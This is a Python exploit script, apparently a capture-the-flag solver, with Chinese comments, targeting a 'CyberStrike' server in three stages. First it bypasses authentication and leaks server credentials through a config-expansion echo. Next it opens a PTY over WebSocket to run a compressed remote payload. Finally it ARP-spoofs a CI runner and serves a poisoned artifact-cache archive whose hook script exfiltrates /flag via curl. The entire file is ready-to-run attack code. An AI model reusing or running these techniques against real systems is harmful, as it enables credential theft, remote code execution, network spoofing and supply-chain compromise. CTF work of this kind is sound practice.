#!/usr/bin/env python3
"""fault_web_and_fault_hash 利用脚本.

阶段 1  认证绕过 + 凭据泄露
        鉴权只按后缀放行静态资源 -> PUT /auth/<providerID>.js 无需认证,
        providerID 指向可控的 base64 反射端点, token 写入一个值为双引号的环境变量,
        配置先展开 {env:VAR} 再解析 JSONC, 解析失败时回显展开后的全文 ->
        从 marker 之间截出 CYBERSTRIKE_SERVER_USERNAME / PASSWORD.

阶段 2  PTY 进容器
        /pty + WebSocket 以 Python 进程作命令入口, 关掉回显后按行收 base64 分片,
        __INPUT_DONE__ 后 zlib 解压 exec 远程阶段代码(应用容器 root + CAP_NET_RAW).

阶段 3  artifact cache 投毒
        容器内用 UDP connect 选网卡, 原始 ARP 解析 cache/runner 的 MAC,
        对 runner 做 ARP 欺骗, 直接应答它带 token 的 lookup 请求,
        把 archiveLocation 指到本方, 再回一个含 restore-hook.sh 的 tar.gz,
        hook 读 /flag 并 POST 回应用容器的回调端口.

用法:
    python exp.py --base http://TARGET --reflector https://<你的base64反射端点>
    python exp.py --base http://TARGET --reflector https://x --cache-ip 10.0.0.2 \
        --cache-port 8080 --runner-ip 10.0.0.3 --callback-port 9000
"""

import argparse
import base64
import hashlib
import json
import secrets
import socket
import sys
import zlib
from urllib.parse import quote

import requests

try:
    import websocket  # websocket-client
except ImportError:  # pragma: no cover
    websocket = None

BOOTSTRAP = (
    "import base64,sys,termios,zlib\n"
    "fd=sys.stdin.fileno();a=termios.tcgetattr(fd);a[3]&=~termios.ECHO\n"
    "termios.tcsetattr(fd,termios.TCSANOW,a);c=[]\n"
    "while True:\n"
    " l=sys.stdin.readline().strip()\n"
    " if l=='__INPUT_DONE__':break\n"
    " c.append(l)\n"
    "exec(compile(zlib.decompress(base64.b64decode(''.join(c))),'<s>','exec'))\n"
)

REMOTE_TEMPLATE = r'''
import io, json, os, socket, struct, sys, tarfile, threading, time

CACHE_IP = "@@CACHE_IP@@"
CACHE_PORT = @@CACHE_PORT@@
RUNNER_IP = "@@RUNNER_IP@@"
CALLBACK_PORT = @@CALLBACK_PORT@@
LISTEN = @@LISTEN@@
PAYLOAD_ID = "vaultlink"

def log(message):
    sys.stdout.write(str(message) + "\n")
    sys.stdout.flush()

def csum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF

def iface_for(ip):
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    probe.connect((ip, 9))
    me = probe.getsockname()[0]
    probe.close()
    import fcntl
    for index, name in socket.if_nameindex():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            res = fcntl.ioctl(sock.fileno(), 0x8915, struct.pack("256s", name[:15].encode()))
            addr = socket.inet_ntoa(res[20:24])
        except OSError:
            addr = None
        sock.close()
        if addr == me:
            return name, me
    raise SystemExit("no interface holding %s" % ip)

def mac_of(iface):
    with open("/sys/class/net/%s/address" % iface) as fh:
        return bytes.fromhex(fh.read().strip().replace(":", ""))

def arp_who_has(raw, me_mac, me_ip, target_ip, timeout=3.0):
    frame = (b"\xff" * 6 + me_mac + b"\x08\x06"
             + struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
             + me_mac + socket.inet_aton(me_ip) + b"\x00" * 6 + socket.inet_aton(target_ip))
    raw.send(frame)
    deadline = time.time() + timeout
    while time.time() < deadline:
        data = raw.recv(65535)
        if data[12:14] != b"\x08\x06" or data[20:22] != b"\x00\x02":
            continue
        if socket.inet_ntoa(data[28:32]) == target_ip:
            return data[22:28]
    return None

def arp_reply(raw, app_mac, cache_ip, runner_mac, runner_ip):
    body = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + app_mac + socket.inet_aton(cache_ip)
    raw.send(runner_mac + app_mac + b"\x08\x06" + body + runner_mac + socket.inet_aton(runner_ip))

def ip_tcp(src_ip, dst_ip, sport, dport, seq, ack, flags, payload):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 65535, 0, 0)
    pseudo = (socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
              + struct.pack("!BBH", 0, 6, len(tcp) + len(payload)))
    tcp = tcp[:16] + struct.pack("!H", csum(pseudo + tcp + payload)) + tcp[18:]
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp) + len(payload), 0, 0x4000,
                     64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + tcp + payload

def build_archive(app_ip, port):
    hook = ("#!/bin/sh\n"
            "P=/tmp/p.$$\n"
            "if [ -r /flag ]; then cat /flag > \"$P\"; U=/flag; else id > \"$P\" 2>&1; U=/diag; fi\n"
            "curl -sS -m 8 -X POST --data-binary @\"$P\" \"http://%s:%d$U\"\n" % (app_ip, port))
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        data = hook.encode()
        info = tarfile.TarInfo("restore-hook.sh")
        info.size = len(data)
        info.mode = 0o755
        tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()

def callback_server(app_ip, port, stop, box):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((app_ip, port))
    srv.listen(8)
    srv.settimeout(1.0)
    while not stop.is_set():
        try:
            conn, _ = srv.accept()
        except socket.timeout:
            continue
        conn.settimeout(5)
        data = b""
        try:
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    head, _, body = data.partition(b"\r\n\r\n")
                    length = 0
                    for line in head.split(b"\r\n"):
                        if line.lower().startswith(b"content-length:"):
                            length = int(line.split(b":")[1])
                    while len(body) < length:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        body += chunk
                    break
        except socket.timeout:
            pass
        conn.close()
        head, _, body = data.partition(b"\r\n\r\n")
        log("CALLBACK " + head.split(b"\r\n")[0].decode("latin-1"))
        try:
            text = body.decode("utf-8", "replace")
        except Exception:
            text = body.hex()
        log("HOOKBODY " + base64.b64encode(body).decode())
        log("HOOKSHA " + hashlib.sha256(body.strip()).hexdigest())
        box.append(text)
        stop.set()
    srv.close()

def main():
    iface, app_ip = iface_for(CACHE_IP)
    app_mac = mac_of(iface)
    log("IFACE %s ip=%s mac=%s" % (iface, app_ip, app_mac.hex()))

    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    raw.bind((iface, 0))
    raw.settimeout(1.0)

    cache_mac = arp_who_has(raw, app_mac, app_ip, CACHE_IP)
    log("MAC cache=%s" % (cache_mac.hex() if cache_mac else "unknown"))

    archive = build_archive(app_ip, CALLBACK_PORT)
    log("ARCHIVE %d bytes" % len(archive))

    stop = threading.Event()
    box = []
    threading.Thread(target=callback_server, args=(app_ip, CALLBACK_PORT, stop, box), daemon=True).start()

    # 只骗 runner: 告诉它 CACHE_IP 在本机网卡上
    def spoof():
        while not stop.is_set():
            arp_reply(raw, app_mac, CACHE_IP, runner_mac, RUNNER_IP)
            time.sleep(0.5)

    runner_mac = arp_who_has(raw, app_mac, app_ip, RUNNER_IP)
    if not runner_mac:
        log("FATAL 无法解析 runner MAC")
        return
    log("MAC runner=%s" % runner_mac.hex())
    threading.Thread(target=spoof, daemon=True).start()

    deadline = time.time() + LISTEN
    served = 0
    log("READY arp-spoof on %s" % iface)
    while time.time() < deadline and not stop.is_set():
        try:
            frame = raw.recv(65535)
        except socket.timeout:
            continue
        if frame[12:14] != b"\x08\x00" or frame[23] != 6:
            continue
        ihl = (frame[14] & 0x0F) * 4
        tcp_off = 14 + ihl
        sport, dport = struct.unpack_from("!HH", frame, tcp_off)
        src_ip = socket.inet_ntoa(frame[26:30])
        dst_ip = socket.inet_ntoa(frame[30:34])
        if dst_ip != CACHE_IP:
            continue
        if src_ip != RUNNER_IP:
            if cache_mac:
                raw.send(cache_mac + app_mac + frame[12:])
            continue
        data_off = tcp_off + (frame[tcp_off + 12] >> 4) * 4
        payload = bytes(frame[data_off:])
        seq, ack = struct.unpack_from("!II", frame, tcp_off + 4)
        flags = frame[tcp_off + 13]
        if flags & 0x02 and not flags & 0x10:
            reply = ip_tcp(CACHE_IP, RUNNER_IP, CACHE_PORT, sport, 0, seq + 1, 0x12, b"")
            raw.send(runner_mac + app_mac + b"\x08\x00" + reply)
            continue
        if not payload:
            continue
        log("REQ " + payload.split(b"\r\n")[0].decode("latin-1")[:120])
        head = payload.split(b"\r\n\r\n")[0]
        if b"download" in head:
            body = archive
            ctype = b"application/gzip"
        elif b"artifactcache" in head:
            body = json.dumps({
                "cacheKey": "vaultlink",
                "scope": "refs/heads/main",
                "archiveLocation": "http://%s:%d/_apis/artifactcache/download/%s"
                                    % (CACHE_IP, CACHE_PORT, PAYLOAD_ID),
                "archiveSize": len(archive),
            }).encode()
            ctype = b"application/json"
        else:
            body = b'{"ok":true}'
            ctype = b"application/json"
        http = (b"HTTP/1.1 200 OK\r\nContent-Type: " + ctype
                + b"\r\nContent-Length: " + str(len(body)).encode()
                + b"\r\nConnection: close\r\n\r\n" + body)
        reply = ip_tcp(CACHE_IP, RUNNER_IP, CACHE_PORT, sport, ack, seq + len(payload),
                       0x18, http)
        raw.send(runner_mac + app_mac + b"\x08\x00" + reply)
        served += 1
        log("SERVED %d" % served)
        if b"download" in head:
            log("WAIT-HOOK")

    # 结束后恢复 runner 的缓存表, 避免把它的网络打断
    try:
        arp_reply(raw, cache_mac, CACHE_IP, runner_mac, RUNNER_IP)
    except Exception:
        pass
    if box:
        log("HOOKTEXT " + box[0].replace("\n", " | "))
    log("__STAGE_DONE__")

main()
'''


def leak_credentials(entry, reflector):
    """阶段 1: 静态后缀绕过 /auth 鉴权 + wellknown 配置源 + 环境变量回显."""
    nonce = secrets.token_hex(8)
    env_key = "PARSE_BREAK_" + nonce.upper()
    marks = ["__M_%s_%d__" % (nonce, i) for i in range(4)]
    config = {
        "username": marks[0] + "{env:CYBERSTRIKE_SERVER_USERNAME}" + marks[1],
        "password": marks[2] + "{env:CYBERSTRIKE_SERVER_PASSWORD}" + marks[3],
        "bad": "{env:" + env_key + "}",
        "_pad": 0,
    }
    blob = ""
    for pad in range(10000):
        config["_pad"] = pad
        blob = base64.b64encode(
            json.dumps({"config": config}, separators=(",", ":")).encode()
        ).decode()
        if "+" not in blob and "/" not in blob:
            break
    else:
        raise RuntimeError("找不到路径安全的 base64 编码")

    provider = "https:%s\\base64\\%s?x=%s.js" % (reflector, blob, nonce)
    auth_url = entry + "/auth/" + quote(provider, safe="")
    body = {"type": "wellknown", "key": env_key, "token": '"'}
    put = requests.put(auth_url, json=body, timeout=20)
    print("[i] PUT /auth/<provider>.js -> %d" % put.status_code)

    # ./ 与 .// 的 64 位组合: 归一化到同一临时目录但字符串不同, 绕开配置/实例缓存
    bits = format(int(nonce, 16), "064b")
    directory = "/tmp/" + "".join("./" if bit == "1" else ".//" for bit in bits)
    text = requests.get(entry + "/?directory=" + quote(directory, safe=""), timeout=20).text
    requests.delete(auth_url, timeout=20)

    try:
        username = text.split(marks[0], 1)[1].split(marks[1], 1)[0]
        password = text.split(marks[2], 1)[1].split(marks[3], 1)[0]
    except IndexError:
        raise RuntimeError("配置回显中没有 marker, 检查反射端点是否返回 JSON")
    print("[+] 泄漏凭据: %s : %s" % (username, password))
    return username, password, directory


def spawn_pty(entry, credentials, remote_source, directory, stage_timeout=180):
    """阶段 2: /pty 创建进程, WebSocket 灌入 zlib+base64 后的远程阶段代码."""
    if websocket is None:
        raise RuntimeError("需要 websocket-client: pip install websocket-client")
    token = base64.b64encode(("%s:%s" % credentials).encode()).decode()
    auth = {"Authorization": "Basic " + token}
    body = {"command": "python3", "args": ["-u", "-c", BOOTSTRAP], "cwd": ".", "title": "probe"}
    response = requests.post(
        entry + "/pty", params={"directory": directory}, headers=auth, json=body, timeout=20
    )
    pty_id = response.json()["id"]
    print("[i] PTY id = %s" % pty_id)

    ws = websocket.create_connection(
        entry.replace("http", "ws", 1) + "/pty/" + quote(pty_id, safe="")
        + "/connect?directory=" + quote(directory, safe=""),
        header=list(auth.items()), timeout=30,
    )
    blob = base64.b64encode(zlib.compress(remote_source.encode(), 9)).decode()
    for index in range(0, len(blob), 1000):
        ws.send(blob[index:index + 1000] + "\n")
    ws.send("__INPUT_DONE__\n")

    collected = ""
    ws.settimeout(stage_timeout)
    while True:
        try:
            chunk = ws.recv()
        except Exception as exc:
            print("[!] WebSocket 读取结束: %s" % exc)
            break
        if not isinstance(chunk, str):
            chunk = chunk.decode("utf-8", "replace")
        collected += chunk
        sys.stdout.write(chunk)
        sys.stdout.flush()
        if "__STAGE_DONE__" in collected or "__STAGE_FATAL__" in collected:
            break
    ws.close()
    return collected


def main():
    parser = argparse.ArgumentParser(description="fault_web_and_fault_hash solver")
    parser.add_argument("--base", default="http://TARGET", help="CyberStrike 入口")
    parser.add_argument("--reflector", default="REFLECTOR_HOST",
                        help="你自己控制的 base64 反射端点(不带协议), 例如 raw.example.com")
    parser.add_argument("--cache-ip", default="10.0.0.2", help="内网 artifact cache 地址")
    parser.add_argument("--cache-port", type=int, default=8080)
    parser.add_argument("--runner-ip", default="10.0.0.3", help="内网 runner 地址")
    parser.add_argument("--callback-port", type=int, default=9000, help="应用容器回调端口")
    parser.add_argument("--listen", type=int, default=120, help="远程阶段监听秒数")
    args = parser.parse_args()

    entry = args.base.rstrip("/")
    if "REFLECTOR" in args.reflector:
        raise SystemExit("[-] 需要 --reflector 指定一个会把 base64 解码后原样返回的端点")

    health = entry + "/global/health"
    username, password, directory = leak_credentials(entry, args.reflector)

    check = requests.get(health, auth=(username, password), timeout=20)
    print("[i] /global/health -> %d %s" % (check.status_code, check.text[:120]))
    if check.status_code != 200 or "healthy" not in check.text.lower():
        print("[!] Basic 凭据校验未通过, 后续阶段可能失败")

    remote = (REMOTE_TEMPLATE
              .replace("@@CACHE_IP@@", args.cache_ip)
              .replace("@@CACHE_PORT@@", str(args.cache_port))
              .replace("@@RUNNER_IP@@", args.runner_ip)
              .replace("@@CALLBACK_PORT@@", str(args.callback_port))
              .replace("@@LISTEN@@", str(args.listen)))

    output = spawn_pty(entry, (username, password), remote, directory, args.listen + 90)

    print("\n===== stage output =====")
    print(output[-4000:])
    if "flag{" in output:
        start = output.index("flag{")
        print("[+] flag: " + output[start:start + 80].split()[0])
    else:
        print("[i] 未在输出中看到 flag, 检查 CACHE_IP/RUNNER_IP 与回调端口")


if __name__ == "__main__":
    main()
